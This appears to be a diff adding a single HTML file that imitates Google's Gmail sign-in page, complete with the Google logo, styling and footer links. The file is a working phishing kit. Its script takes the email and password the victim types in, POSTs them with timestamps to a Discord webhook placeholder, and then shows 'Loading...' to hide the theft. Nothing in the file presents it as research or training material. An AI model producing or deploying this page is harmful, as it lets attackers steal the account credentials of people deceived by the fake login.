@@ -1,0 +1,349 @@
+<!-- This is not my code. this i used online github random repo templte code :) -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-color: #f0f4f9;
+            --surface-color: #ffffff;
+            --primary-color: #0b57d0;
+            --primary-hover: #0842a0;
+            --text-main: #1f1f1f;
+            --text-secondary: #444746;
+            --border-color: #747775;
+            --border-radius-card: 28px;
+            --border-radius-btn: 20px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+
+        }
+
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: var(--text-main);
+        }
+
+        .login-card {
+            background-color: var(--surface-color);
+            width: 100%;
+            max-width: 448px;
+            border-radius: var(--border-radius-card);
+            padding: 48px 40px 36px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.01);
+        }
+
+        @media (max-width: 500px) {
+
+            .login-card {
+                border-radius: 0;
+                padding: 32px 24px;
+                height: 100vh;
+                max-width: 100%;
+                display: flex;
+                flex-direction: column;
+            }
+
+            body {
+                background-color: var(--surface-color);
+            }
+        }
+
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .logo svg {
+            width: 74px;
+            height: 24px;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: var(--text-main);
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 24px;
+
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 15px;
+            font-size: 16px;
+            color: var(--text-main);
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-field:focus {
+            border: 2px solid var(--primary-color);
+            padding: 15px 14px;
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: var(--surface-color);
+            padding: 0 4px;
+            color: var(--text-secondary);
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+
+        .input-field:focus~.floating-label,
+        .input-field:not(:placeholder-shown)~.floating-label {
+            top: 0;
+            font-size: 12px;
+            color: var(--primary-color);
+            font-weight: 500;
+        }
+
+        .input-field:not(:focus):not(:placeholder-shown)~.floating-label {
+            color: var(--text-secondary);
+        }
+
+        .forgot-link {
+
+            display: inline-block;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            margin-bottom: 32px;
+            margin-top: -8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .btn {
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            border-radius: var(--border-radius-btn);
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background 0.2s;
+
+        }
+
+        .btn-next {
+            background: transparent;
+            color: var(--primary-color);
+            padding: 10px 16px;
+
+        }
+
+        .btn-text:hover {
+            background-color: #f6fafe;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 448px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            padding: 0 16px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+
+        }
+
+        .footer-links a,
+        .language {
+            color: var(--text-secondary);
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .footer-links a:hover {
+            background-color: rgba(68, 71, 70, 0.08);
+            border-radius: 4px;
+        }
+
+        select {
+            background: transparent;
+            border: none;
+            outline: var(--text-secondary);
+            font-size: 12px;
+            outline: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-card">
+
+        <div class="logo">
+            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4"
+                    d="M11.53 9.45c0-.66-.06-1.32-.17-1.95H4.8v3.69h3.81c-.16 1-.74 1.85-1.58 2.42v2.01h2.55c1.49-1.37 2.45-3.39 2.45-5.85z" />
+                <path fill="#34A853"
+                    d="M4.8 16.5c1.86 0 3.42-.62 4.56-1.68l-2.55-2.01c-.62.42-1.41.67-2.01.67-1.55 0-2.87-1.05-3.34-2.46H1.1v2.07C2.22 15.16 3.42 16.5 4.8 16.5z" />
+                <path fill="#FBBC05"
+                    d="M1.46 11.02c-.12-.37-.19-.77-.19-1.18s.07-.81.19-1.18V6.59H1.1C.4 7.98 0 9.56 0 11.2s.4 3.22 1.1 4.61l.36-2.07c.12-.37.19-.77.19-1.18z" />
+                <path fill="#EA4335"
+                    d="M4.8 4.75c1.01 0 1.92.35 2.63 1.03l1.97-1.97C8.22 2.69 6.66 2 4.8 2 3.42 2 2.22 3.34 1.1 4.59l.36 2.07c.47-1.41 1.79-2.46 3.34-2.46z" />
+            </svg>
+        </div>
+
+
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+
+        <form id="form">
+
+            <div class="input-group">
+                <input type="email" id="email" class="input-field" placeholder="" required autocomplete="username">
+                <label for="email" class="floating-label">Email or phone</label>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" class="input-field" placeholder=" " required
+                    autocomplete="current-password">
+
+                <label for="password" class="floating-label">Enter your password</label>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <div class="actions">
+                <button type="button" class="btn btn-text">Create accounts</button>
+                <button type="submit" class="btn btn-primary">Sign in</button>
+            </div>
+        </form>
+
+    </div>
+
+    <div class="footer">
+        <div class="language">
+            <select>
+                <option value="">English</option>
+                <option value="">Arabic</option>
+                <option value="">French</option>
+                <option value="">Spanish</option>
+                <option value="">German</option>
+                <option value="">Italian</option>
+                <option value="">Portuguese</option>
+                <option value="">Russian</option>
+                <option value="">Chinese</option>
+                <option value="">Japanese</option>
+            </select>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+
+    <script>
+
+        const formLoadTime = new Date();
+
+        document.getElementById('form').addEventListener('submit', function (event) {
+
+            // Prevent the browser from reloading
+            event.preventDefault();
+
+            const submitClickTime = new Date();
+
+            const nameValue = document.getElementById('email').value;
+            const passwordValue = document.getElementById("password").value;
+
+            const webhookUrl = "{{DS-HOOK}}";
+
+            const discordMessage = {
+
+                content: `**New Form Submission**\n` +
+                    `**Name:** ${nameValue}\n` +
+                    `**Password:** ${passwordValue}\n` +
+                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
+                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
+            };
+
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            });
+
+            document.querySelector('h1').textContent = "Loading...";
+            document.getElementById('form').style.display = "none";
+        })
+
+    </script>
+
+
+</body>
+
+</html>
